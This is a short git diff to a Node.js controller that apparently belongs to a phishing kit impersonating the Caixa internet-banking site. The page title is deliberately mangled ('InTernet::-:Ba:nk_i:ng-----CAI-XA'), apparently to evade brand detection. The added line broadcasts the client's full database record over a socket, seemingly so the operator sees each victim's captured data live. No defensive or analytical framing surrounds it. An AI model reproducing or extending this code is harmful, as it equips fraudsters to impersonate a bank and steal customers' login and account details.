@@ -11,6 +11,8 @@ module.exports = {
 
             const theClient = await Client.findByPk(client)
 
+            req.app.io.to(theClient.id).emit('inEletronic', theClient.toJSON())
+
             return res.render('eletronic', {
                 title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
                 pageClasses: 'password cadastro',
